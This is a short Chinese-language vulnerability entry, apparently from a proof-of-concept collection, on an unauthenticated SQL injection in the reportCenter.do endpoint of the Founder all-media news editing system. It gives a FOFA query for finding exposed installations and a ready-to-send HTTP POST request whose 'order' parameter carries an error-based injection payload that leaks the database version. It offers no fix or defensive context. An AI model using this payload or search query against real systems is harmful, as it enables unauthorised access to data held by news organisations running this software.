## 方正畅享全媒体新闻采编系统reportCenter.do存在SQL注入漏洞

方正畅享全媒体新闻采编系统reportCenter.do存在SQL注入漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中信息。

## fofa

```
app="FOUNDER-全媒体采编系统"
```

## poc

```javascript
POST /newsedit/report/reportCenter.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
```

